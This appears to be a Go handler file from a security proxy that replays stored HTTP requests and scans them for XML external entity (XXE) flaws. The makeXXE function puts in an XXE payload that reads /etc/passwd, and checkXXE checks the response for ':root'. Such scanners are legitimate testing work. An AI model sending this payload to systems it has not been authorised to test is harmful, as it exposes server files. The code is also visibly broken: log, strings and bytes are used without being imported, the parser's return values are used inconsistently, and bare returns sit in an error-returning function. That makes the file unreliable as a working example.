package handler

import (
	"fmt"
	"github.com/labstack/echo/v4"
	"io"
	"net/http"
	"security/model"
	"security/parser"
	"security/store"
)

type Handler struct {
	store store.Store
}

func NewHandler(store store.Store) Handler {
	return Handler{store: store}
}

func (h *Handler) GetRequests(ctx echo.Context) error {
	requests := h.store.GetRequests()

	return ctx.JSON(http.StatusOK, requests)
}

func (h *Handler) GetRequestByID(ctx echo.Context) error {
	request := h.store.GetRequestByID(ctx.Param("id"))

	return ctx.JSON(http.StatusOK, request)
}

func (h *Handler) RepeatRequestByID(ctx echo.Context) error {
	request := h.store.GetRequestByID(ctx.Param("id"))
	repeatRequest := parser.ParseRepeatRequest(request)

	ctx.Request().URL = repeatRequest.URL
	ctx.Request().Header.Del("Proxy-Connection")

	resp, err := http.DefaultTransport.RoundTrip(ctx.Request())
	if err != nil {
		panic(err)
	}
	copyHeaders(ctx.Response().Header(), resp.Header)

	responseBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	_, err = ctx.Response().Write(responseBody)
	if err != nil {
		panic(err)
	}

	return ctx.JSON(http.StatusOK, resp)
}

func (h *Handler) ScanRequestByID(ctx echo.Context) error {
	request := h.store.GetRequestByID(ctx.Param("id"))
	repeatRequest := parser.ParseRepeatRequest(request)

	ctx.Request().URL = repeatRequest.URL
	ctx.Request().Header.Del("Proxy-Connection")

	resp, err := http.DefaultTransport.RoundTrip(ctx.Request())
	if err != nil {
		panic(err)
	}
	copyHeaders(ctx.Response().Header(), resp.Header)

	responseBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	_, err = ctx.Response().Write(responseBody)
	if err != nil {
		panic(err)
	}

	parsedRequest, err := parser.ParseRepeatRequest(makeXXE(request))
    if err != nil {
        log.Print(err)
        fmt.Println("failed to get vulnerable request")
        return
    }

    repeatedResp, err := http.DefaultTransport.RoundTrip(parsedRequest)
    if err != nil {
    	log.Print(err)
    	 fmt.Println("failed to send request to repeat")
    	return
    }

    if checkXXE(repeatedResp) {
        fmt.Println("XXE was found")
    }

	return nil
}

func makeXXE(request *model.Request) *model.Request {
	if strings.Contains(request.Body, "<?xml") {
		request.Body = `
		<!DOCTYPE foo [
			<!ELEMENT foo ANY >
			<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
		<foo>&xxe;</foo>
		`
	}
	return request
}

func checkXXE(r *http.Response) bool {
	b, err := io.ReadAll(r.Body)
	if err != nil {
		log.Println("failed to read body")
		return false
	}

	if bytes.Index(b, []byte(":root")) != -1 {
		return true
	}

	return false
}

func copyHeaders(dst, src http.Header) {
	for k, vv := range src {
		for _, v := range vv {
			dst.Add(k, v)
		}
	}
}
